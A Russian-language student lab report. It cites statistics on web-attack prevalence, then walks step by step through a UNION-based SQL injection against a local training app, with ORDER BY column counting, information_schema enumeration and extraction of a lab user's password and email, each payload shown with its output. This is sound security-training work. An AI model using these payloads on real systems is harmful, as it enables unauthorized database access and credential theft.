# Лабораторная работа №1

## Часть I

### 1. Источники
1. Positive Technologies — «CODE RED 2026: Актуальные киберугрозы для российских организаций»  
   [https://ptsecurity.com/research/analytics/russia-cyberthreat-landscape-2026/](https://ptsecurity.com/research/analytics/russia-cyberthreat-landscape-2026/)
2. RED Security — аналитика SOC 
   [https://cisoclub.ru/analitika-red-security-soc-tret-vseh-vzlomov-pr/](https://cisoclub.ru/analitika-red-security-soc-tret-vseh-vzlomov-pr/)
3. ComNews / «Вебмониторэкс» — «Российские компании отразили 600 млн веб-атак» (2025)  
   [https://www.comnews.ru/content/240386/2025-07-28/2025-w31/1008/rossiyskie-kompanii-otrazili-600-mln-veb-atak](https://www.comnews.ru/content/240386/2025-07-28/2025-w31/1008/rossiyskie-kompanii-otrazili-600-mln-veb-atak)

4. Astra — Cyber Security Vulnerability Statistics 2026  
   [https://www.getastra.com/blog/security-audit/cyber-security-vulnerability-statistics/](https://www.getastra.com/blog/security-audit/cyber-security-vulnerability-statistics/)

### 2. Доля успешных атак с помощью эксплуатации веб-уязвимостей
1. 50% успешных взломов (RED Security) связаны с уязвимостями веб-приложений.
2. Доля веб-атак в госсекторе составляет 11%, в IT-компаниях — 9% (Positive Technologies).

### 3. Распределение по конкретным уязвимостям
Согласно данным OWASP Top 10 (Astra), наиболее распространёнными типами уязвимостей в веб-приложениях являются:

| Тип уязвимости | Доля приложений, содержащих уязвимость|
|---|---|
| Broken Access Control | 3.81% |
| Injection | 3.37% |
| Security Misconfiguration | 4.50% |

По данным "Вебмониторэкс":

| Тип атаки | Доля от общего числа веб-атак |
|---|---|
| XSS (межсайтовый скриптинг) | 25% |
| RCE (удалённое исполнение кода) | 14% |
| Path Traversal (обход путей) | 11% |
| Прочие типы | 50% |
## Часть II
### Поиск пользователей
На странице `http://localhost:8080/task/` было сказано ввести параметр id. Переберём id от 1, пока не найдём нужных пользователей. Результаты:

`http://localhost:8080/task/?id=1` Ваш id:1 Ваш логин:admin

...

`http://localhost:8080/task/?id=4` Ваш id:4 Ваш логин:Vinni-pukh

...

`http://localhost:8080/task/?id=9` Ваш id:9 Ваш логин:Volk2

`http://localhost:8080/task/?id=10` Здесь и далее пустые страницы.

### Проверка на SQL-инъекцию
Добавим кавычку в запрос:

`http://localhost:8080/task/?id=1'`

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

Наш ввод попал в запрос и нарушил его структуру – приложение уязвимо для SQL-инъекций.

### Определение числа столбцов
Для использования UNION нужно знать, сколько столбцов возвращает исходный запрос. Применим ORDER BY, последовательно увеличивая номер:

`http://localhost:8080/task/?id=1' ORDER BY 1--+` – работает

`http://localhost:8080/task/?id=1' ORDER BY 2--+` – работает

`http://localhost:8080/task/?id=1' ORDER BY 3--+` – работает

`http://localhost:8080/task/?id=1' ORDER BY 4--+` – ошибка Unknown column '4' in 'order clause'

Значит, столбцов - 3.

### Определение выводимых колонок
Теперь выясним, какие из этих трёх столбцов отображаются на странице. Возьмём заведомо несуществующий id=10, чтобы первая часть запроса ничего не вернула, и подставим свои значения:
`http://localhost:8080/task/?id=10' UNION SELECT 1,2,3--+`

Ваш id:1
Ваш логин:2

Цифра 3 нигде не появилась – на страницу выводятся только первая и вторая колонки. Третья колонка не видна.

### Получение списка таблиц
Узнаем, какие таблицы есть в текущей базе данных. Обратимся к information_schema:
`http://localhost:8080/task/?id=10' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--+`

Ваш id:emails
Ваш логин:2

Но такой запрос вернул только одну таблицу – видимо, из-за LIMIT 1 в исходном запросе. Чтобы обойти это, используем GROUP_CONCAT, который соберёт все имена в одну строку:

`http://localhost:8080/task/?id=10' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()--+`

Ваш id:emails,users
Ваш логин:2. В базе две таблицы.

### Получение структуры таблиц
Теперь узнаем названия колонок в каждой таблице.

Для users:

`http://localhost:8080/task/?id=10' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users'--+`

Ваш id:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
Ваш логин:2. Нас интересуют id, username, password.

Для emails:

`http://localhost:8080/task/?id=10' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='emails'--+`

Ваш id:id,email_id
Ваш логин:2. 

Мы получили структуру всех таблиц.

### Извлечение пароля Volk2
Пробуем вывести данные пользователя с id=9:

`http://localhost:8080/task/?id=10' UNION SELECT password,id,username FROM users WHERE id=9--+`

Ваш id:Wa spoiuuuuu
Ваш логин:9

Пароль найден: **Wa spoiuuuuu**.

### Извлечение почты Vinni-pukh
Для Vinni-pukh id=4. Используем таблицу emails:

`http://localhost:8080/task/?id=10' UNION SELECT email_id,id,3 FROM emails WHERE id=4--+`

Ваш id:honey_lover@otus-lab.com
Ваш логин:4

Почта получена: **honey_lover@otus-lab.com**.

### Итоговые ответы
1. Пароль пользователя Volk2: **Wa spoiuuuuu**
2. Почта пользователя Vinni-pukh: **honey_lover@otus-lab.com**

